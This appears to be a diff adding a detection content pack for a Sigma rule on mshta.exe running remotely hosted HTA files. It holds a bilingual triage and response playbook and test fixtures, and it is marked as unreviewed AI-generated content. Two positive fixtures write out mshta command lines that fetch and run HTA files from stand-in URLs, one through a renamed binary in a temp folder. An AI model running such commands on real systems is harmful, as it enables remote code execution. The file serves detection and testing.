@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "b98d0db6-511d-45de-ad02-e82a98729620",
+    "title": "Remotely Hosted HTA File Executed Via Mshta.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_mshta_http.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_mshta_http.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218.005"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó mshta.exe con una URL http://, https:// o ftp:// en la línea de comandos. Esto suele indicar que se descargó y ejecutó un archivo HTA alojado de forma remota.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en \\mshta.exe u OriginalFileName es MSHTA.EXE, y el CommandLine contiene 'http://', 'https://' o 'ftp://'.",
+      "why_it_matters": "Mshta es un binario firmado de Windows que ejecuta código VBScript o JScript dentro de archivos HTA. Los atacantes lo usan para ejecutar payloads remotos y evadir controles de aplicaciones (ATT&CK T1218.005, ejecución mediante binario proxy del sistema).",
+      "triage_steps": [
+        "Revise el CommandLine completo: extraiga la URL, el dominio o la IP y el nombre del archivo, y determine si el destino es interno, conocido o recién registrado.",
+        "Analice ParentImage y la línea de comandos del padre. Un mshta lanzado por Office, un navegador, explorer.exe desde un LNK o wscript es sospechoso.",
+        "Confirme que la ruta de Image sea System32 o SysWOW64. Si OriginalFileName es MSHTA.EXE pero el nombre es distinto, el binario fue renombrado.",
+        "Busque procesos hijos de mshta.exe, como powershell, cmd, rundll32 o regsvr32, y archivos escritos en %TEMP% o %APPDATA%.",
+        "Correlacione conexiones de red y consultas DNS del mismo host hacia esa URL en una ventana de +/- 15 minutos.",
+        "Revise el correo y las descargas del usuario en ese intervalo, y busque alertas previas del mismo host, usuario o dominio.",
+        "Busque la misma URL o el mismo dominio en otros endpoints para medir el alcance."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos.",
+        "Aplicaciones heredadas internas o instaladores que cargan HTA desde un servidor web corporativo.",
+        "Scripts de administración o de inicio de sesión que abren un HTA desde una intranet; verifique el dominio y al responsable."
+      ],
+      "response_steps": [
+        "Valide la legitimidad de la URL con el dueño de la aplicación o con inteligencia de amenazas antes de actuar.",
+        "Si es maliciosa, aísle el endpoint y termine mshta.exe y sus procesos hijos.",
+        "Bloquee el dominio o la IP en el proxy, el DNS y el firewall, y obtenga el HTA para analizarlo.",
+        "Elimine los mecanismos de persistencia creados (Run keys, tareas programadas, archivos LNK) y restablezca las credenciales del usuario si hubo ejecución.",
+        "Considere restringir mshta.exe con AppLocker o WDAC si el negocio no lo necesita."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque la ejecución remota de HTA mediante mshta casi nunca es legítima y es una técnica común de acceso inicial y evasión."
+    },
+    "en": {
+      "summary": "mshta.exe ran with an http://, https:// or ftp:// URL on its command line. This usually means a remotely hosted HTA file was fetched and executed.",
+      "what_it_detects": "Process creation events where Image ends with \\mshta.exe or OriginalFileName is MSHTA.EXE, and CommandLine contains 'http://', 'https://' or 'ftp://'.",
+      "why_it_matters": "Mshta is a signed Windows binary that runs VBScript or JScript inside HTA files. Attackers abuse it to run remote payloads and bypass application controls (ATT&CK T1218.005, system binary proxy execution).",
+      "triage_steps": [
+        "Read the full CommandLine: extract the URL, the domain or IP and the file name, then check whether the destination is internal, known or newly registered.",
+        "Review ParentImage and the parent command line. Mshta spawned by Office, a browser, explorer.exe via a LNK file or wscript is suspicious.",
+        "Confirm Image is in System32 or SysWOW64. If OriginalFileName is MSHTA.EXE but the file name differs, the binary was renamed.",
+        "Look for child processes of mshta.exe, such as powershell, cmd, rundll32 or regsvr32, and for files written to %TEMP% or %APPDATA%.",
+        "Correlate network connections and DNS queries from the same host to that URL within +/- 15 minutes.",
+        "Check the user's email and downloads in that window, and look for earlier alerts on the same host, user or domain.",
+        "Search other endpoints for the same URL or domain to scope the incident."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives.",
+        "Internal legacy applications or installers that load HTA files from a corporate web server.",
+        "Admin or logon scripts that open an intranet-hosted HTA; verify the domain and its owner."
+      ],
+      "response_steps": [
+        "Check whether the URL is legitimate with the application owner or threat intelligence before acting.",
+        "If it is malicious, isolate the endpoint and terminate mshta.exe and its child processes.",
+        "Block the domain or IP at the proxy, DNS and firewall, and retrieve the HTA for analysis.",
+        "Remove any persistence that was created (Run keys, scheduled tasks, LNK files) and reset the user's credentials if code ran.",
+        "Consider restricting mshta.exe with AppLocker or WDAC where the business does not need it."
+      ],
+      "severity_rationale": "High fits because remote HTA execution through mshta is rarely legitimate and is a common technique for initial access and defense evasion."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "mshta launched by Outlook executes a remote HTA over HTTPS",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\mshta.exe",
+          "OriginalFileName": "MSHTA.EXE",
+          "CommandLine": "\"C:\\Windows\\System32\\mshta.exe\" https://cdn.example.com/invoice/update.hta",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""
+        }
+      },
+      {
+        "description": "Renamed mshta (OriginalFileName MSHTA.EXE) fetching an HTA by IP over HTTP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0208.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Users\\mrodriguez\\AppData\\Local\\Temp\\winhelp.exe",
+          "OriginalFileName": "MSHTA.EXE",
+          "CommandLine": "winhelp.exe http://198.51.100.23/a.hta",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "mshta opening a local HTA file with no URL in the command line",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\mshta.exe",
+          "OriginalFileName": "MSHTA.EXE",
+          "CommandLine": "\"C:\\Windows\\System32\\mshta.exe\" \"C:\\Program Files\\ContosoTools\\setup.hta\"",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      },
+      {
+        "description": "Browser opening an HTTPS URL; the URL matches but the image is not mshta",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+          "OriginalFileName": "msedge.exe",
+          "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" https://intranet.example.com/portal",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:29+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
